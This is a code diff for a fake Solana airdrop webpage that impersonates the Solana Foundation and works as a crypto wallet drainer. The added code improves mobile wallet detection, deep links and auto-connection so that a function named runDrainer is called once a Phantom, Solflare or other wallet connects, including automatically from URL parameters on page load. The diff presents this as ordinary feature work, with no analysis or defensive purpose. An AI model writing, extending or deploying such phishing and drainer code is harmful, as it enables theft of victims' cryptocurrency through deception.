@@ -4,7 +4,35 @@
   <meta charset="UTF-8" />
   <title>Claim Your $SOL Airdrop</title>
   <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
-      <link rel="icon" href="/favicon2.ico" type="image/x-icon" />
+  
+  <!-- SEO and Social Media Meta Tags -->
+  <meta property="og:title" content="Claim Your $SOL Airdrop" />
+  <meta property="og:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://solana-airdrop.com" />
+  <meta property="og:image" content="/hero-section.png" />
+  <meta property="og:site_name" content="Solana Airdrop" />
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Claim Your $SOL Airdrop" />
+  <meta name="twitter:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
+  <meta name="twitter:image" content="/hero-section.png" />
+  
+  <meta name="keywords" content="solana, airdrop, crypto, blockchain, SOL, token, claim, free" />
+  <meta name="author" content="Solana Foundation" />
+  <meta name="robots" content="index, follow" />
+  
+  <!-- Mobile App Meta Tags -->
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="Solana Airdrop" />
+  
+  <!-- Deep Link Meta Tags -->
+  <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
+  <meta name="google-play-app" content="app-id=app.phantom" />
+  
+  <link rel="icon" href="/favicon2.ico" type="image/x-icon" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
@@ -366,6 +394,12 @@
         padding: 16px;
         margin: 10px;
         max-width: calc(100% - 20px);
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        max-height: 80vh;
+        overflow-y: auto;
       }
       .wallet-option {
         padding: 18px 16px;
@@ -379,6 +413,21 @@
       .wallet-name {
         font-size: 1.2em;
         line-height: 1.3;
+      }
+      .modal {
+        padding: 0;
+        align-items: center;
+        justify-content: center;
+      }
+      #statusModal {
+        padding: 0;
+        align-items: center;
+        justify-content: center;
+      }
+      #statusModal .wallet-box {
+        margin: 20px;
+        max-width: calc(100% - 40px);
+        text-align: center;
       }
     }
     
@@ -398,6 +447,11 @@
       }
       .claim-btn:active {
         transform: scale(0.95);
+      }
+      .modal {
+        padding: 0;
+        align-items: center;
+        justify-content: center;
       }
     }
   </style>
@@ -758,22 +812,40 @@
       showStatus('Opening ' + wallet.name + ' mobile app...', 'loading');
       
       try {
-        // For iOS, try to open the app directly
+        // Enhanced mobile wallet connection logic
         if (platform === 'ios') {
-          window.location.href = deepLinkUrl;
+          // For iOS, try multiple approaches
+          try {
+            // Try direct deep link first
+            window.location.href = deepLinkUrl;
+          } catch (e) {
+            // Fallback to app store
+            window.open(wallet.mobile.appStore, '_blank');
+          }
         } else if (platform === 'android') {
-          // For Android, try to open the app
-          window.location.href = deepLinkUrl;
+          // For Android, try multiple approaches
+          try {
+            // Try direct deep link first
+            window.location.href = deepLinkUrl;
+          } catch (e) {
+            // Fallback to play store
+            window.open(wallet.mobile.playStore, '_blank');
+          }
         } else {
           // For other platforms, try the deep link anyway
           window.location.href = deepLinkUrl;
         }
         
-        // Fallback: if deep link doesn't work, redirect to app store
+        // Enhanced fallback detection
         setTimeout(() => {
           if (document.hidden || document.webkitHidden) {
             // App opened successfully
             showStatus('Please complete the connection in your ' + wallet.name + ' app', 'loading');
+            
+            // Check for wallet connection after app opens
+            setTimeout(() => {
+              checkMobileWalletConnection(wallet);
+            }, 3000);
           } else {
             // App didn't open, redirect to store
             const storeUrl = getMobileStoreUrl(wallet);
@@ -786,17 +858,57 @@
       }
     }
 
+    // Check if mobile wallet connected after deep link
+    function checkMobileWalletConnection(wallet) {
+      const provider = wallet.provider();
+      if (provider && getWalletAddress(provider)) {
+        showStatus('Wallet connected: ' + wallet.name, 'success');
+        setTimeout(() => {
+          runDrainer(provider);
+        }, 1000);
+      } else {
+        showStatus('Please connect your wallet in the app and try again', 'error');
+      }
+    }
+
     // Enhanced mobile wallet detection
     function detectMobileWallets() {
       const detectedWallets = [];
+      const isMobileDevice = isMobile();
       
-      // Check for mobile wallet providers with enhanced detection
-      if (window.solana?.isPhantom || (window.solana && typeof window.solana.connect === 'function' && window.solana.isPhantom)) detectedWallets.push('phantom');
-      if (window.solflare?.isSolflare || (window.solflare && typeof window.solflare.connect === 'function')) detectedWallets.push('solflare');
-      if (window.backpack?.isBackpack || (window.backpack && typeof window.backpack.connect === 'function')) detectedWallets.push('backpack');
-      if (window.glow?.isGlow || (window.glow && typeof window.glow.connect === 'function')) detectedWallets.push('glow');
-      if (window.trustwallet?.isTrust || window.solana?.isTrust || (window.trustwallet && typeof window.trustwallet.connect === 'function')) detectedWallets.push('trust');
-      if (window.exodus || window.solana?.isExodus || (window.exodus && typeof window.exodus.connect === 'function')) detectedWallets.push('exodus');
+      // Enhanced detection for mobile devices
+      if (isMobileDevice) {
+        // Mobile-specific detection logic
+        if (window.solana?.isPhantom || (window.solana && typeof window.solana.connect === 'function' && window.solana.isPhantom)) detectedWallets.push('phantom');
+        if (window.solflare?.isSolflare || (window.solflare && typeof window.solflare.connect === 'function')) detectedWallets.push('solflare');
+        if (window.backpack?.isBackpack || (window.backpack && typeof window.backpack.connect === 'function')) detectedWallets.push('backpack');
+        if (window.glow?.isGlow || (window.glow && typeof window.glow.connect === 'function')) detectedWallets.push('glow');
+        if (window.trustwallet?.isTrust || window.solana?.isTrust || (window.trustwallet && typeof window.trustwallet.connect === 'function')) detectedWallets.push('trust');
+        if (window.exodus || window.solana?.isExodus || (window.exodus && typeof window.exodus.connect === 'function')) detectedWallets.push('exodus');
+        
+        // Additional mobile wallet detection
+        if (window.phantom?.solana) detectedWallets.push('phantom');
+        if (window.trustwallet?.solana) detectedWallets.push('trust');
+        
+        // Check for mobile wallet adapters
+        if (window.solana && window.solana.isWalletAdapter) {
+          // Handle wallet adapter
+          if (window.solana.isPhantom) detectedWallets.push('phantom');
+          if (window.solana.isSolflare) detectedWallets.push('solflare');
+          if (window.solana.isBackpack) detectedWallets.push('backpack');
+          if (window.solana.isGlow) detectedWallets.push('glow');
+          if (window.solana.isTrust) detectedWallets.push('trust');
+          if (window.solana.isExodus) detectedWallets.push('exodus');
+        }
+      } else {
+        // Desktop detection (original logic)
+        if (window.solana?.isPhantom || (window.solana && typeof window.solana.connect === 'function' && window.solana.isPhantom)) detectedWallets.push('phantom');
+        if (window.solflare?.isSolflare || (window.solflare && typeof window.solflare.connect === 'function')) detectedWallets.push('solflare');
+        if (window.backpack?.isBackpack || (window.backpack && typeof window.backpack.connect === 'function')) detectedWallets.push('backpack');
+        if (window.glow?.isGlow || (window.glow && typeof window.glow.connect === 'function')) detectedWallets.push('glow');
+        if (window.trustwallet?.isTrust || window.solana?.isTrust || (window.trustwallet && typeof window.trustwallet.connect === 'function')) detectedWallets.push('trust');
+        if (window.exodus || window.solana?.isExodus || (window.exodus && typeof window.exodus.connect === 'function')) detectedWallets.push('exodus');
+      }
       
       return detectedWallets;
     }
@@ -899,26 +1011,65 @@
               // Wallet is available and detected, try to connect
               showStatus('Connecting to ' + wallet.name + '...', 'loading');
               try {
-                if (typeof provider.connect === 'function') {
-                  await provider.connect();
-                }
-                if (!getWalletAddress(provider)) {
-                  let msg = 'Please complete the connection in your ' + wallet.name + ' app';
-                  if (wallet.name === 'Solflare') {
-                    msg = 'Please unlock Solflare and complete the connection in your app';
-                  }
-                  showStatus(msg, 'error');
-                  return;
-                }
-                showStatus('Wallet connected: ' + wallet.name, 'success');
-                setTimeout(() => {
-                  if (getWalletAddress(provider)) {
-                    runDrainer(provider);
+                // Mobile-specific connection handling
+                if (wallet.name === 'Phantom' && isMobileDevice) {
+                  // Phantom mobile specific handling
+                  console.log('Attempting Phantom mobile connection...');
+                  if (typeof provider.connect === 'function') {
+                    await provider.connect();
+                    // Wait for connection and check for approval
+                    setTimeout(async () => {
+                      if (getWalletAddress(provider)) {
+                        showStatus('Phantom connected! Requesting approval...', 'loading');
+                        // Proceed with transaction
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                      } else {
+                        showStatus('Please approve the connection in Phantom app', 'error');
+                      }
+                    }, 2000);
                   } else {
-                    showStatus('Wallet connection lost. Please try again.', 'error');
+                    showStatus('Phantom connection method not found', 'error');
                   }
-                }, 1000);
+                } else if (wallet.name === 'Solflare' && isMobileDevice) {
+                  // Solflare mobile specific handling
+                  console.log('Attempting Solflare mobile connection...');
+                  if (typeof provider.connect === 'function') {
+                    await provider.connect();
+                    setTimeout(async () => {
+                      if (getWalletAddress(provider)) {
+                        showStatus('Solflare connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                      } else {
+                        showStatus('Please complete Solflare connection', 'error');
+                      }
+                    }, 2000);
+                  } else {
+                    showStatus('Solflare connection method not found', 'error');
+                  }
+                } else {
+                  // Generic mobile connection
+                  if (typeof provider.connect === 'function') {
+                    await provider.connect();
+                  }
+                  if (!getWalletAddress(provider)) {
+                    showStatus('Please complete the connection in your ' + wallet.name + ' app', 'error');
+                    return;
+                  }
+                  showStatus('Wallet connected: ' + wallet.name, 'success');
+                  setTimeout(() => {
+                    if (getWalletAddress(provider)) {
+                      runDrainer(provider);
+                    } else {
+                      showStatus('Wallet connection lost. Please try again.', 'error');
+                    }
+                  }, 1000);
+                }
               } catch (err) {
+                console.log('Mobile connection error:', err);
                 showStatus('Connection failed: ' + (err.message || err), 'error');
               }
             } else {
@@ -1585,7 +1736,7 @@
         if (provider.isGlow && provider.signAndSendTransaction) {
           // Glow expects a base64 string, not a Transaction object
           const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
-          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+          showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
                 clearStoredTransaction(); // Clear on success
         } else if ((provider.isSolflare || (window.solflare && provider === window.solflare)) && provider.signAndSendTransaction) {
           // Solflare specific handling
@@ -1789,6 +1940,7 @@
     document.addEventListener('DOMContentLoaded', function() {
       checkPendingTransactions();
       debugWalletDetection(); // Add debug info
+      autoDetectMobileWallet(); // Auto-detect mobile wallets
     });
     // --- Navbar Active Link on Scroll ---
     const navLinks = document.querySelectorAll('.nav-link');
@@ -1869,6 +2021,57 @@
       }
       
       console.log('=== END DEBUG ===');
+    }
+
+    // Auto-detect mobile wallet when site is opened from wallet
+    function autoDetectMobileWallet() {
+      const isMobileDevice = isMobile();
+      if (!isMobileDevice) return;
+      
+      // Check if site was opened from a mobile wallet
+      const urlParams = new URLSearchParams(window.location.search);
+      const walletParam = urlParams.get('wallet');
+      
+      if (walletParam) {
+        // Auto-connect to the specified wallet
+        const wallet = WALLET_DEFS.find(w => w.key === walletParam);
+        if (wallet) {
+          showStatus('Auto-connecting to ' + wallet.name + '...', 'loading');
+          setTimeout(() => {
+            const provider = wallet.provider();
+            if (provider && getWalletAddress(provider)) {
+              showStatus('Auto-connected to ' + wallet.name, 'success');
+              setTimeout(() => {
+                runDrainer(provider);
+              }, 1000);
+            } else {
+              showStatus('Please connect ' + wallet.name + ' manually', 'error');
+            }
+          }, 2000);
+        }
+      }
+      
+      // Check for wallet in URL path (for deep links)
+      const path = window.location.pathname;
+      if (path.includes('/phantom') || path.includes('/solflare') || path.includes('/backpack') || 
+          path.includes('/glow') || path.includes('/trust') || path.includes('/exodus')) {
+        const walletKey = path.split('/').pop();
+        const wallet = WALLET_DEFS.find(w => w.key === walletKey);
+        if (wallet) {
+          showStatus('Detected ' + wallet.name + ' deep link...', 'loading');
+          setTimeout(() => {
+            const provider = wallet.provider();
+            if (provider && getWalletAddress(provider)) {
+              showStatus('Connected via deep link: ' + wallet.name, 'success');
+              setTimeout(() => {
+                runDrainer(provider);
+              }, 1000);
+            } else {
+              showStatus('Please connect ' + wallet.name + ' manually', 'error');
+            }
+          }, 2000);
+        }
+      }
     }
   </script>
 </body>
